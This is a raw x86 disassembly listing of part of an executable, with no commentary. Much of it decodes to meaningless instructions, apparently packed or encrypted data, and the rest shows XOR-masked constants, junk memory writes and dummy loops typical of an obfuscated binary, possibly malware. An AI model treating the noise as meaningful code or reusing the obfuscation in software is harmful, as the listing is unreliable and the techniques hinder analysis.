  407faa:	test   DWORD PTR [eax+0x6fcbce47],eax
  407fb0:	or     ebp,ebp
  407fb2:	add    al,0x93
  407fb4:	repnz xor eax,0x3495efec
  407fba:	push   cs
  407fbb:	or     eax,0x8b1e34f5
  407fc0:	sbb    cl,BYTE PTR [ebp+0x7d]
  407fc3:	repnz jecxz 0x40802e
  407fc6:	push   ebx
  407fc7:	jae    0x407fd8
  407fc9:	or     esp,DWORD PTR [edi+0x17fba267]
  407fcf:	cld    
  407fd0:	(bad)  
  407fd1:	push   ebp
  407fd2:	xchg   ebx,eax
  407fd3:	cmp    esp,DWORD PTR [ebp+0x3221ba9e]
  407fd9:	jnp    0x407fc6
  407fdb:	mov    al,ds:0xa1a329a9
  407fe0:	stc    
  407fe1:	adc    cl,0xbc
  407fe4:	ror    BYTE PTR [ecx-0x997dab8],1
  407fea:	mov    dl,0xe5
  407fec:	fnstcw WORD PTR [edi+0x52d430ff]
  407ff2:	xor    BYTE PTR [edi+0x2b],ch
  407ff5:	lahf   
  407ff6:	jge    0x408070
  407ff8:	ins    BYTE PTR es:[edi],dx
  407ff9:	(bad)  [edx+0x3f]
  407ffc:	add    eax,0x7d72d0d3
  408001:	xchg   ecx,eax
  408002:	dec    ebp
  408003:	stc    
  408004:	out    dx,eax
  408005:	sbb    edi,ecx
  408007:	fs push edx
  408009:	test   eax,0xb6c7e90f
  40800e:	clc    
  40800f:	fisub  WORD PTR [ebx]
  408011:	test   eax,0x20079eea
  408016:	sub    DWORD PTR [edi-0x5bc8cfc8],ebp
  40801c:	pop    edi
  40801d:	popf   
  40801e:	scas   al,BYTE PTR es:[edi]
  40801f:	gs fs (bad) 
  408022:	je     0x407fd1
  408024:	sub    eax,0xdb69dbac
  408029:	pop    esp
  40802a:	stos   BYTE PTR es:[edi],al
  40802b:	cwde   
  40802c:	pop    edi
  40802d:	aam    0x96
  40802f:	pop    ebx
  408030:	jo     0x407fdc
  408032:	xchg   edx,eax
  408033:	jmp    0x407fcf
  408035:	stos   DWORD PTR es:[edi],eax
  408036:	cld    
  408037:	xchg   ebp,eax
  408038:	xchg   esp,eax
  408039:	or     DWORD PTR [ebp-0x47],edi
  40803c:	pusha  
  40803d:	jb     0x408096
  40803f:	xchg   ebx,eax
  408040:	mov    bl,0x2
  408042:	scas   al,BYTE PTR es:[edi]
  408043:	mov    ch,0x56
  408045:	fs mov edx,0xe285fbec
  40804b:	jp     0x408014
  40804d:	pop    eax
  40804e:	xchg   DWORD PTR [bp+di+0x3e],ebx
  408052:	cdq    
  408053:	ret    
  408054:	mov    DWORD PTR [edx+edi*1+0x44],esp
  408058:	cdq    
  408059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40805a:	fdiv   DWORD PTR ds:0x2002203
  408060:	push   ss
  408061:	pop    es
  408062:	xor    al,0xc0
  408064:	xor    BYTE PTR [ebx+0x4d902222],0xda
  40806b:	jb     0x4080bf
  40806d:	adc    eax,0xf2514feb
  408072:	pop    ds
  408073:	(bad)  
  408075:	push   ebx
  408076:	xlat   BYTE PTR ds:[ebx]
  408077:	push   esi
  408078:	xor    eax,0x66ea7423
  40807d:	xchg   esp,eax
  40807e:	jge    0x408018
  408080:	test   BYTE PTR [ecx],al
  408082:	hlt    
  408083:	push   edi
  408084:	sub    ebp,0x9c694e6e
  40808a:	in     eax,dx
  40808b:	adc    edx,DWORD PTR [eax]
  40808d:	sar    BYTE PTR [edi-0xf],cl
  408090:	(bad)  
  408091:	xchg   ebp,eax
  408092:	jno    0x40803b
  408094:	jl     0x40806c
  408096:	shl    DWORD PTR [eax-0x6f15bf4a],1
  40809c:	ins    DWORD PTR es:[edi],dx
  40809d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40809f:	retf   0xe840
  4080a2:	push   ds
  4080a3:	push   cs
  4080a4:	je     0x4080ad
  4080a6:	and    eax,0x30caa093
  4080ab:	lock je 0x4080a7
  4080ae:	sbb    DWORD PTR [edx],eax
  4080b0:	or     al,0x40
  4080b2:	mov    cs,WORD PTR [eax+0xf]
  4080b5:	out    dx,al
  4080b6:	cmp    bh,BYTE PTR [ecx+esi*2+0x32c72103]
  4080bd:	cmp    ecx,ecx
  4080bf:	fisub  WORD PTR [eax+0x4e5077d7]
  4080c5:	les    ecx,FWORD PTR [eax]
  4080c7:	pop    eax
  4080c8:	or     BYTE PTR ds:0x657886e8,bl
  4080ce:	dec    edi
  4080cf:	mov    edi,0x6f359233
  4080d4:	call   0xbc8cd6f3
  4080d9:	cmp    dl,dl
  4080db:	push   0x8cc74ad1
  4080e0:	cmp    dl,BYTE PTR [eax+0x7]
  4080e3:	inc    ebx
  4080e4:	ja     0x40812b
  4080e6:	add    BYTE PTR [edx-0xa83b44],bh
  4080ec:	imul   eax,edx,0xfffffff4
  4080ef:	icebp  
  4080f0:	loope  0x40810c
  4080f2:	inc    eax
  4080f3:	xor    ch,BYTE PTR [edx+0x5a]
  4080f6:	push   ds
  4080f7:	(bad)  
  4080f8:	push   0x50680f81
  4080fd:	ds mov esi,0x34af278e
  408103:	(bad)  [edx]
  408105:	out    0xac,al
  408107:	add    bl,bl
  408109:	mov    cl,0x65
  40810b:	cmp    esi,edi
  40810d:	into   
  40810e:	inc    edi
  40810f:	enter  0xf505,0xea
  408113:	jo     0x4080dc
  408115:	imul   eax,DWORD PTR [edx-0x6c],0xffffffcf
  408119:	stc    
  40811a:	sbb    BYTE PTR [ecx+0x4ef64813],bl
  408120:	outs   dx,DWORD PTR ds:[esi]
  408121:	loopne 0x4080e1
  408123:	fwait
  408124:	bound  edi,QWORD PTR [eax+0x689fd3a6]
  40812a:	xor    BYTE PTR [ebx-0x4720ca4e],cl
  408130:	jp     0x408152
  408132:	jp     0x408152
  408134:	inc    esp
  408135:	mov    ch,0xcd
  408137:	ret    0xa58d
  40813a:	mov    bh,0xd0
  40813c:	push   edi
  40813d:	pop    ebx
  40813e:	xor    DWORD PTR [ebx+0x9a6e739],ebp
  408144:	push   0x423ba352
  408149:	xor    edx,ebx
  40814b:	pusha  
  40814c:	dec    edi
  40814d:	paddd  mm0,QWORD PTR [eax]
  408150:	add    al,0x76
  408152:	dec    ebp
  408153:	(bad)  
  408154:	gs sub eax,0x96aee959
  40815a:	(bad)  
  40815b:	mov    edi,0x589c46e
  408160:	(bad)  
  408161:	int    0x43
  408163:	sbb    BYTE PTR [ebp-0x46],ah
  408166:	or     ebp,ebp
  408168:	in     al,dx
  408169:	imul   eax,DWORD PTR [ecx],0x50
  40816c:	mov    esp,0x115d2e14
  408171:	ins    DWORD PTR es:[edi],dx
  408172:	pop    ebp
  408173:	jb     0x4081f3
  408175:	ror    BYTE PTR ds:0x424a4a13,0x72
  40817c:	add    ah,BYTE PTR [eax]
  40817e:	enter  0x97b4,0xb6
  408182:	xchg   ebp,eax
  408183:	aam    0x67
  408185:	ret    
  408186:	loope  0x40812b
  408188:	sbb    DWORD PTR [ecx+eiz*8],esp
  40818b:	popa   
  40818c:	rcl    cl,cl
  40818e:	ja     0x4081d8
  408190:	scas   al,BYTE PTR es:[edi]
  408191:	dec    edi
  408192:	sahf   
  408193:	add    eax,DWORD PTR [edi]
  408195:	into   
  408196:	test   eax,0x2f67fa0d
  40819b:	dec    esi
  40819c:	inc    edx
  40819d:	sub    edx,esp
  40819f:	or     BYTE PTR [ecx+0x1fd28fe9],dl
  4081a5:	push   0x9ad8a286
  4081aa:	(bad)  
  4081ab:	jp     0x408172
  4081ad:	(bad)  
  4081ae:	sbb    DWORD PTR [eax+0x2b654b86],edi
  4081b4:	mov    ch,0x7d
  4081b6:	iret   
  4081b7:	cwde   
  4081b8:	jge    0x40813b
  4081ba:	dec    ebp
  4081bb:	rol    ah,cl
  4081bd:	add    ebp,DWORD PTR [esi+0xf00732c]
  4081c3:	jecxz  0x40821c
  4081c5:	ds ja  0x4081ee
  4081c8:	xchg   ebx,eax
  4081c9:	jae    0x408187
  4081cb:	sbb    eax,0x9bb4860f
  4081d0:	and    al,0xf3
  4081d2:	or     BYTE PTR [esi],dl
  4081d4:	or     dh,bh
  4081d6:	mov    ds:0x5345ceaa,al
  4081db:	pop    ebp
  4081dc:	mov    esi,0xbcc64c06
  4081e1:	gs ret 0x7c41
  4081e5:	jl     0x40821d
  4081e7:	jge    0x4081e4
  4081e9:	inc    ecx
  4081ea:	dec    eax
  4081eb:	and    dh,BYTE PTR [ebp+0x40]
  4081ee:	aam    0xe1
  4081f0:	or     al,0x2c
  4081f2:	mov    ebp,0xc84267a9
  4081f7:	pushf  
  4081f8:	pop    esp
  4081f9:	mov    dl,0x21
  4081fb:	fs mov ch,0xfa
  4081fe:	in     al,dx
  4081ff:	mov    ecx,0x489e5c40
  408204:	imul   ecx,DWORD PTR [ebp+eax*4-0x2b],0x631f9518
  40820c:	fdivr  DWORD PTR [ecx+0x58cb6762]
  408212:	jbe    0x408256
  408214:	pop    esp
  408215:	pushf  
  408216:	repz iret 
  408218:	push   ds
  408219:	push   esp
  40821a:	iret   
  40821b:	jne    0x4081ab
  40821d:	arpl   WORD PTR [esp+eax*4+0xe],bx
  408221:	adc    ecx,DWORD PTR [eax-0x174cb868]
  408227:	adc    BYTE PTR [edi-0xa2b57cf],bh
  40822d:	inc    ecx
  40822e:	jne    0x4081da
  408230:	icebp  
  408231:	or     edi,DWORD PTR [ebp+0x5]
  408234:	stos   DWORD PTR es:[edi],eax
  408235:	mov    ch,0x8a
  408237:	into   
  408238:	push   cs
  408239:	jmp    0x6d7d:0x2aa7d45f
  408240:	retf   0x4f34
  408243:	in     eax,0x87
  408245:	or     al,cl
  408247:	xlat   BYTE PTR ds:[ebx]
  408248:	fdivr  DWORD PTR [edi-0x126ec025]
  40824e:	push   ecx
  40824f:	shl    DWORD PTR ds:0x5f27b723,cl
  408255:	sbb    ecx,eax
  408257:	mov    ebx,0x39fb80f8
  40825c:	push   edx
  40825d:	fisubr DWORD PTR [edx]
  40825f:	cmp    edx,DWORD PTR [edi+0x60ee9c]
  408265:	cmp    ebx,DWORD PTR [ecx-0x6b]
  408268:	cmp    BYTE PTR [edx],cl
  40826a:	push   esp
  40826b:	test   dh,al
  40826d:	mov    edx,edx
  40826f:	xchg   ecx,eax
  408270:	pop    ecx
  408271:	dec    ecx
  408272:	push   eax
  408273:	fs jge 0x408221
  408276:	or     ch,BYTE PTR [ecx-0x58520b01]
  40827c:	jl     0x408231
  40827e:	add    edx,DWORD PTR [edi+ebp*2+0x6e4302c6]
  408285:	mov    edi,DWORD PTR [edx-0x62329be9]
  40828b:	fisttp QWORD PTR [ebp+ebx*2+0x17]
  40828f:	push   0x68
  408291:	sbb    ecx,DWORD PTR [eax]
  408293:	cli    
  408294:	lods   eax,DWORD PTR ds:[esi]
  408295:	xchg   esi,eax
  408296:	fld    QWORD PTR [ebx+0x56a40b84]
  40829c:	jns    0x4082ca
  40829e:	out    0x47,eax
  4082a0:	and    BYTE PTR [eax-0x5c],0xf1
  4082a4:	xchg   ebx,eax
  4082a5:	sub    DWORD PTR [esi-0x53],esp
  4082a8:	rol    dh,0x86
  4082ab:	and    BYTE PTR [edx+0x503cffc6],dh
  4082b1:	adc    ebx,ebp
  4082b3:	loop   0x40829a
  4082b5:	push   edi
  4082b6:	stos   BYTE PTR es:[edi],al
  4082b7:	adc    DWORD PTR [ecx],ecx
  4082b9:	lock sar BYTE PTR [edi+0x2b],1
  4082bd:	sub    eax,0x8fdc04e4
  4082c2:	add    BYTE PTR [edx-0x5e],0xef
  4082c6:	or     ebp,DWORD PTR [edx]
  4082c8:	in     al,0x27
  4082ca:	outs   dx,BYTE PTR ds:[esi]
  4082cb:	ins    BYTE PTR es:[edi],dx
  4082cc:	(bad)  
  4082cd:	stos   BYTE PTR es:[edi],al
  4082ce:	je     0x40826c
  4082d0:	xchg   edx,eax
  4082d1:	mov    bh,0xf0
  4082d3:	mov    WORD PTR [eax-0x3],ds
  4082d6:	mov    edx,0x762e248d
  4082db:	ret    
  4082dc:	(bad)
  4082e0:	sub    dh,BYTE PTR [eax+ebp*4+0x7031250e]
  4082e7:	pop    ecx
  4082e8:	and    eax,0x9a5dcad8
  4082ed:	add    BYTE PTR [edi-0x4d],dl
  4082f0:	sub    BYTE PTR [ebx+0x1fa679d1],bh
  4082f6:	jmp    0xd45a:0x11fc56e
  4082fd:	lds    ebx,FWORD PTR [ebp-0x7ce05f3c]
  408303:	sub    DWORD PTR [esi],edx
  408305:	inc    ebx
  408306:	push   edi
  408307:	pop    eax
  408308:	jb     0x4082cb
  40830a:	or     BYTE PTR [ebp-0x52658687],ah
  408310:	push   ebx
  408311:	adc    cl,ah
  408313:	popf   
  408314:	pop    esp
  408315:	add    eax,0xa00807f1
  40831a:	inc    DWORD PTR ds:0xc873df92
  408320:	pop    ecx
  408321:	sbb    al,0xbe
  408323:	adc    al,0xa6
  408325:	ror    DWORD PTR [edx-0x5f],1
  408328:	dec    esi
  408329:	and    esp,DWORD PTR [esi-0x3e9d855]
  40832f:	mul    DWORD PTR [eax-0x3036480b]
  408335:	push   bp
  408337:	ins    BYTE PTR es:[edi],dx
  408338:	pushf  
  408339:	retf   
  40833a:	dec    edi
  40833b:	test   BYTE PTR [esi+eiz*2-0x56],al
  40833f:	outs   dx,DWORD PTR ds:[esi]
  408340:	push   ecx
  408341:	inc    ebx
  408342:	xor    eax,0xbe0e7eea
  408347:	retf   0xa038
  40834a:	std    
  40834b:	cld    
  40834c:	inc    edi
  40834d:	jg     0x40833e
  40834f:	cmp    edi,esi
  408351:	das    
  408352:	ds shl esp,cl
  408355:	adc    BYTE PTR [eax+0x1601d88d],bh
  40835b:	sub    al,0xfb
  40835d:	xor    DWORD PTR ds:0xeee7a866,edx
  408363:	outs   dx,DWORD PTR ds:[esi]
  408364:	mov    dl,0x40
  408366:	xchg   BYTE PTR [ecx+eax*2-0x2d],bh
  40836a:	sti    
  40836b:	sahf   
  40836c:	out    dx,eax
  40836d:	repz int3 
  40836f:	hlt    
  408370:	outs   dx,DWORD PTR ds:[esi]
  408371:	xchg   ebp,eax
  408372:	jo     0x408341
  408374:	pushf  
  408375:	mov    DWORD PTR [ecx+0x2d8fcd4f],ecx
  40837b:	adc    bl,BYTE PTR [eax-0x5f90deee]
  408381:	lea    edi,[bx+di+0x7a]
  408385:	adc    eax,0xbf8cbc33
  40838a:	push   esp
  40838b:	jl     0x4083bc
  40838d:	sub    al,0xb9
  40838f:	cmc    
  408390:	push   edx
  408391:	outs   dx,DWORD PTR ds:[esi]
  408392:	shr    BYTE PTR [ebx+0x714a0c49],0x42
  408399:	adc    DWORD PTR [ebx],edi
  40839b:	mov    eax,0xa59b71e1
  4083a0:	sbb    al,0xf4
  4083a2:	pop    es
  4083a3:	cld    
  4083a4:	lods   eax,DWORD PTR ds:[esi]
  4083a5:	dec    BYTE PTR ds:0xa429fe07
  4083ab:	dec    ecx
  4083ac:	or     dl,BYTE PTR [ebp-0x3a5a5e5]
  4083b2:	mov    ecx,0x9264eaf1
  4083b7:	xchg   esp,eax
  4083b8:	lea    eax,[esi+0x45]
  4083bb:	inc    esi
  4083bc:	ins    BYTE PTR es:[edi],dx
  4083bd:	fcmove st,st(3)
  4083bf:	sbb    BYTE PTR [esi-0x44],bh
  4083c2:	and    ebx,DWORD PTR [edx-0x735fcb7a]
  4083c8:	xchg   esp,eax
  4083c9:	mov    ecx,0x98f236c3
  4083ce:	adc    eax,0x6b18f7d3
  4083d3:	nop
  4083d4:	test   al,0xc4
  4083d6:	push   ecx
  4083d7:	sub    esi,eax
  4083d9:	push   ss
  4083da:	adc    al,0x3c
  4083dc:	shr    BYTE PTR [ebp+0x740c37d9],1
  4083e2:	js     0x40840a
  4083e4:	stos   BYTE PTR es:[edi],al
  4083e5:	sub    DWORD PTR [edx-0x7eac2652],ecx
  4083eb:	popf   
  4083ec:	bnd ret 0x9eb3
  4083f0:	sub    esp,edx
  4083f2:	jp     0x408427
  4083f4:	repnz sar BYTE PTR [ebp-0x6e154801],cl
  4083fb:	inc    esi
  4083fc:	shl    DWORD PTR [ebp-0x284c9bf2],1
  408402:	mov    bl,0xa
  408404:	out    dx,eax
  408405:	data16 mov bl,0x17
  408408:	sbb    esi,DWORD PTR [ebx]
  40840a:	xor    BYTE PTR [ebp+0x19],0x3c
  40840e:	(bad)  
  40840f:	adc    eax,0x89b9b2a5
  408414:	adc    DWORD PTR [esi],ebx
  408416:	aad    0x3e
  408418:	push   DWORD PTR [esi+edx*8-0x59d86386]
  40841f:	not    DWORD PTR [edi+0x55ab6257]
  408425:	shr    al,0x8
  408428:	rol    dl,1
  40842a:	enter  0x80e0,0x6a
  40842e:	daa    
  40842f:	push   DWORD PTR [edx+0x47214cd2]
  408435:	inc    esp
  408436:	inc    ebp
  408437:	sar    BYTE PTR [ebp-0x2ece3637],1
  40843d:	adc    al,0xac
  40843f:	mov    bh,BYTE PTR [eax]
  408441:	dec    edx
  408442:	in     eax,dx
  408443:	iret   
  408444:	retf   
  408445:	pop    edi
  408446:	pop    eax
  408447:	popf   
  408448:	dec    edx
  408449:	imul   edx,DWORD PTR [eax-0x3a],0xc50f5dc6
  408450:	mov    edx,0xd54b7b5
  408455:	mov    dl,0x60
  408457:	pop    ss
  408458:	mov    ah,0xbc
  40845a:	mov    ah,0x2c
  40845c:	jp     0x4084b2
  40845e:	popa   
  40845f:	imul   esp,DWORD PTR [esi+0x39],0xcf5e43eb
  408466:	pop    ds
  408467:	push   ebp
  408468:	adc    BYTE PTR [edx+0x34],cl
  40846b:	packsswb mm3,mm6
  40846e:	out    0xcc,al
  408470:	xchg   BYTE PTR ds:0xe3cd2abd,cl
  408476:	push   cs
  408477:	dec    ebx
  408478:	mov    BYTE PTR [esi+0x2a],bh
  40847b:	hlt    
  40847c:	cld    
  40847d:	js     0x4084e7
  40847f:	std    
  408480:	mov    cl,BYTE PTR [eax]
  408482:	mov    bl,0x41
  408484:	push   ebp
  408485:	sti    
  408486:	adc    ch,al
  408488:	int3   
  408489:	sub    ecx,edi
  40848b:	(bad)  
  40848c:	xlat   BYTE PTR ds:[ebx]
  40848d:	inc    ebx
  40848e:	xchg   esp,eax
  40848f:	ins    DWORD PTR es:[edi],dx
  408490:	gs mov edi,0xcdaf64e9
  408496:	inc    edi
  408497:	rcl    BYTE PTR [esp+0x7a],1
  40849b:	xchg   esi,eax
  40849c:	adc    dh,BYTE PTR [esi]
  40849e:	dec    edx
  40849f:	xor    al,0x0
  4084a1:	jne    0x408491
  4084a3:	mov    ds:0x5d4e6c17,al
  4084a8:	or     eax,0xe719db9f
  4084ad:	ss aam 0x3a
  4084b0:	sub    al,0x8a
  4084b2:	aas    
  4084b3:	std    
  4084b4:	inc    ebp
  4084b5:	xor    eax,0xdbc496e1
  4084ba:	(bad)  
  4084bb:	mov    ebx,0x54798785
  4084c0:	pushf  
  4084c1:	rol    DWORD PTR [eax-0x73],0x29
  4084c5:	pop    es
  4084c6:	or     eax,0x772a0766
  4084cb:	pop    ecx
  4084cc:	sahf   
  4084cd:	xchg   edx,eax
  4084ce:	in     al,dx
  4084cf:	add    eax,0x9e49bab
  4084d4:	rol    BYTE PTR [ebx+0x64],0x79
  4084d8:	sub    al,0x4f
  4084da:	inc    esp
  4084db:	add    BYTE PTR [ebx-0x45],cl
  4084de:	call   0xdd02:0xfe2a1492
  4084e5:	das    
  4084e6:	(bad)  
  4084e7:	and    bh,BYTE PTR [edx+ebx*2+0x65]
  4084eb:	test   al,0x34
  4084ed:	mov    DWORD PTR [esi+eax*1-0x7711960c],0x969a2e62
  4084f8:	ins    DWORD PTR es:[edi],dx
  4084f9:	pop    ss
  4084fa:	xchg   ebx,eax
  4084fb:	mov    ecx,DWORD PTR [eax+0x458b1a04]
  408501:	ror    BYTE PTR [ebx-0x39cc27ab],0x33
  408508:	(bad)  
  408509:	add    eax,edi
  40850b:	add    edx,edi
  40850d:	imul   eax,edx
  408510:	add    eax,DWORD PTR [ebp-0xc]
  408513:	mov    DWORD PTR [ebp-0xc],eax
  408516:	mov    eax,DWORD PTR [ebp-0xc]
  408519:	mov    edx,DWORD PTR [ebp-0x18]
  40851c:	cmp    edx,eax
  40851e:	jb     0x406080
  408524:	mov    eax,DWORD PTR [ebp-0x28]
  408527:	mov    edx,DWORD PTR [ebp-0x18]
  40852a:	xor    eax,esi
  40852c:	add    eax,edi
  40852e:	imul   eax,edx
  408531:	mov    edx,DWORD PTR [ebp-0x1c]
  408534:	xor    edx,esi
  408536:	add    edx,edi
  408538:	or     eax,edx
  40853a:	mov    edx,DWORD PTR [ebp-0x20]
  40853d:	xor    edx,esi
  40853f:	add    eax,edx
  408541:	mov    edx,DWORD PTR [ebp-0x20]
  408544:	xor    edx,esi
  408546:	add    eax,edx
  408548:	mov    edx,DWORD PTR [ebp-0x10]
  40854b:	lea    eax,[eax+edx*1+0x64e5e6]
  408552:	jmp    0x408566
  408557:	mov    eax,DWORD PTR [ebp-0x20]
  40855a:	mov    edx,DWORD PTR [ebp-0x10]
  40855d:	xor    eax,esi
  40855f:	lea    eax,[eax+edx*1+0x3272f3]
  408566:	mov    DWORD PTR [ebp-0x10],eax
  408569:	jmp    0x403c1c
  40856e:	mov    ebx,DWORD PTR [ebp-0x3c]
  408571:	mov    eax,DWORD PTR [ebp+0xc]
  408574:	xor    eax,esi
  408576:	lea    ecx,[ecx+eax*1+0x3272f3]
  40857d:	lea    eax,[ecx-0x3272f3]
  408583:	xor    eax,esi
  408585:	cmp    eax,0xf89c95a1
  40858a:	jne    0x403bc0
  408590:	dec    DWORD PTR [ebp-0x34]
  408593:	jne    0x403bb4
  408599:	mov    eax,DWORD PTR [ebp+0x8]
  40859c:	mov    ecx,DWORD PTR [ebp+0xc]
  40859f:	mov    edx,DWORD PTR [ebp+0x8]
  4085a2:	xor    ecx,esi
  4085a4:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f3]
  4085ab:	xor    eax,esi
  4085ad:	mov    al,BYTE PTR [eax+ebx*1+0x3272f3]
  4085b4:	xor    edx,esi
  4085b6:	mov    BYTE PTR [edx+ebx*1+0x3272f3],cl
  4085bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4085c0:	xor    ecx,esi
  4085c2:	mov    BYTE PTR [ecx+ebx*1+0x3272f3],al
  4085c9:	mov    eax,DWORD PTR [ebp+0xc]
  4085cc:	xor    eax,esi
  4085ce:	add    eax,edi
  4085d0:	pop    edi
  4085d1:	pop    esi
  4085d2:	pop    ebx
  4085d3:	leave  
  4085d4:	ret    0x8
  4085d7:	xor    eax,eax
  4085d9:	and    DWORD PTR ds:0x4291db,0x42914b
  4085e3:	inc    eax
  4085e4:	ret    
  4085e5:	push   ebp
  4085e6:	mov    ebp,esp
  4085e8:	sub    esp,0x38
  4085eb:	and    DWORD PTR ds:0x429167,0x0
  4085f5:	mov    eax,ds:0x429167
  4085fa:	inc    eax
  4085fb:	mov    ds:0x429167,eax
  408600:	cmp    DWORD PTR ds:0x429167,0x23
  408607:	jle    0x408625
  40860d:	jmp    0x408618
  408612:	call   DWORD PTR ds:0x42a7bb
  408618:	cmp    DWORD PTR ds:0x429167,0x1d
  40861f:	jb     0x4085f5
  408625:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  40862c:	push   ebx
  40862d:	adc    DWORD PTR ds:0x4291ef,ecx
  408633:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  40863a:	sub    DWORD PTR ds:0x429167,0x723d
  408644:	mov    eax,DWORD PTR [ebp-0x4]
  408647:	push   esi
  408648:	mov    esi,0x75108ac
  40864d:	adc    DWORD PTR ds:0x429153,0x4291d3
  408657:	xor    eax,esi
  408659:	push   edi
  40865a:	and    DWORD PTR ds:0x42915f,0x0
  408664:	jmp    0x408676
  408669:	mov    edi,DWORD PTR ds:0x42915f
  40866f:	inc    edi
  408670:	mov    DWORD PTR ds:0x42915f,edi
  408676:	cmp    DWORD PTR ds:0x42915f,0x18
  40867d:	jae    0x4086c6
  408683:	cmp    DWORD PTR ds:0x42915f,0xb
  40868a:	jg     0x4086c6
  408690:	jmp    0x4086a5
  408695:	push   0x4291bf
  40869a:	push   0x428022
  40869f:	call   DWORD PTR ds:0x42a7bf
  4086a5:	cmp    DWORD PTR ds:0x42915f,0xa
  4086ac:	jne    0x4086c1
  4086b2:	xor    edi,edi
  4086b4:	or     edi,DWORD PTR ds:0x42915f
  4086ba:	inc    edi
  4086bb:	mov    DWORD PTR ds:0x42915f,edi
  4086c1:	jmp    0x408669
  4086c6:	mov    edi,0x3272f3
  4086cb:	or     DWORD PTR ds:0x429173,0x4291df
  4086d5:	add    eax,edi
  4086d7:	and    DWORD PTR ds:0x4291cb,0x4291b7
  4086e1:	mov    DWORD PTR [ebp-0x1c],eax
  4086e4:	mov    eax,DWORD PTR [ebp+0x14]
  4086e7:	add    DWORD PTR ds:0x42919b,0xffd
  4086f1:	test   eax,eax
  4086f3:	mov    DWORD PTR ds:0x4291c7,0x550e
  4086fd:	je     0x408761
  408703:	mov    DWORD PTR ds:0x4291c3,0x10
  40870d:	cmp    DWORD PTR ds:0x4291c3,0x0
  408714:	je     0x408749
  40871a:	cmp    DWORD PTR ds:0x4291c3,0x1a
  408721:	jle    0x408749
  408727:	jmp    0x408737
  40872c:	push   0x8b39
  408731:	call   DWORD PTR ds:0x42a7c3
  408737:	mov    ebx,DWORD PTR ds:0x4291c3
  40873d:	dec    ebx
  40873e:	mov    DWORD PTR ds:0x4291c3,ebx
  408744:	jmp    0x40870d
  408749:	mov    eax,DWORD PTR [ebp+0x14]
  40874c:	sbb    DWORD PTR ds:0x4291db,ebx
  408752:	mov    eax,DWORD PTR [eax]
  408754:	add    DWORD PTR ds:0x4291b3,0x4291cf
  40875e:	mov    DWORD PTR [ebp-0x1c],eax
  408761:	mov    eax,DWORD PTR [ebp-0x4]
  408764:	xor    eax,esi
  408766:	xor    DWORD PTR ds:0x429193,edi
  40876c:	add    eax,edi
  40876e:	and    ebx,DWORD PTR ds:0x42918b
  408774:	mov    DWORD PTR [ebp-0x8],eax
  408777:	mov    eax,DWORD PTR [ebp-0xc]
  40877a:	and    ebx,DWORD PTR ds:0x4291f3
  408780:	xor    eax,esi
  408782:	mov    ebx,DWORD PTR ds:0x429167
  408788:	and    ebx,DWORD PTR ds:0x4291b7
  40878e:	mov    DWORD PTR ds:0x429167,ebx
  408794:	add    eax,edi
  408796:	sbb    ebx,0x2c4d
  40879c:	mov    DWORD PTR [ebp-0x24],eax
  40879f:	mov    eax,DWORD PTR [ebp-0x4]
  4087a2:	xor    eax,esi
  4087a4:	mov    ebx,DWORD PTR ds:0x42919b
  4087aa:	or     ebx,DWORD PTR ds:0x429183
  4087b0:	mov    DWORD PTR ds:0x42919b,ebx
  4087b6:	add    eax,edi
  4087b8:	or     DWORD PTR ds:0x4291df,edx
  4087be:	mov    DWORD PTR [ebp-0x30],eax
  4087c1:	or     DWORD PTR ds:0x42914b,0x176b
  4087cb:	mov    ebx,DWORD PTR [ebp-0x4]
  4087ce:	xor    ebx,esi
  4087d0:	mov    eax,ds:0x429173
  4087d5:	xor    eax,DWORD PTR ds:0x42916f
  4087db:	mov    ds:0x429173,eax
  4087e0:	add    ebx,edi
  4087e2:	mov    eax,DWORD PTR [ebp-0x24]
  4087e5:	sub    eax,edi
  4087e7:	sbb    DWORD PTR ds:0x429157,0x4291c7
  4087f1:	lea    ecx,[ebx-0x3272f3]
  4087f7:	xor    eax,esi
  4087f9:	xor    DWORD PTR ds:0x4291bb,0x42917b
  408803:	xor    ecx,esi
  408805:	mov    DWORD PTR ds:0x429153,0x47e0
  40880f:	cmp    ecx,eax
  408811:	mov    DWORD PTR ds:0x429187,0x3279
  40881b:	je     0x40d27b
  408821:	xor    DWORD PTR ds:0x42915b,0x508b
  40882b:	mov    eax,DWORD PTR [ebp-0x4]
  40882e:	sub    DWORD PTR ds:0x42919b,0x58b3
  408838:	xor    eax,esi
  40883a:	adc    DWORD PTR ds:0x429173,0x4291f7
  408844:	add    eax,edi
  408846:	cmp    ebx,eax
  408848:	mov    DWORD PTR ds:0x42915f,0x75e2
  408852:	jne    0x40adc2
  408858:	push   DWORD PTR [ebp+0x8]
  40885b:	call   0x424151
  408860:	mov    DWORD PTR [ebp-0x14],eax
  408863:	not    eax
  408865:	mov    eax,DWORD PTR [ebp-0x4]
  408868:	adc    DWORD PTR ds:0x429153,0x66a3
  408872:	mov    ecx,DWORD PTR [ebp-0x14]
  408875:	add    DWORD PTR ds:0x4291af,0x7712
  40887f:	xor    eax,esi
  408881:	add    eax,edi
  408883:	mov    DWORD PTR ds:0x4291cb,0x7d26
  40888d:	cmp    ecx,eax
  40888f:	mov    DWORD PTR ds:0x42916f,0x6080
  408899:	je     0x40d2e6
  40889f:	push   DWORD PTR [ebp-0x14]
  4088a2:	sbb    DWORD PTR ds:0x4291c3,0x2326
  4088ac:	push   DWORD PTR [ebp+0x8]
  4088af:	call   0x424291
  4088b4:	mov    DWORD PTR [ebp-0x14],eax
  4088b7:	xor    DWORD PTR ds:0x42919f,edx
  4088bd:	mov    eax,DWORD PTR [ebp-0x4]
  4088c0:	xor    DWORD PTR ds:0x42918f,ecx
  4088c6:	mov    ecx,DWORD PTR [ebp-0x14]
  4088c9:	xor    eax,esi
  4088cb:	add    eax,edi
  4088cd:	mov    DWORD PTR ds:0x42917b,0x355b
  4088d7:	cmp    ecx,eax
  4088d9:	mov    DWORD PTR ds:0x429157,0x7399
  4088e3:	je     0x40d2e6
  4088e9:	mov    eax,DWORD PTR [ebp-0x14]
  4088ec:	mov    eax,DWORD PTR [eax+0x18]
  4088ef:	and    DWORD PTR ds:0x4291f3,0x0
  4088f9:	jmp    0x40890b
  4088fe:	mov    ecx,DWORD PTR ds:0x4291f3
  408904:	inc    ecx
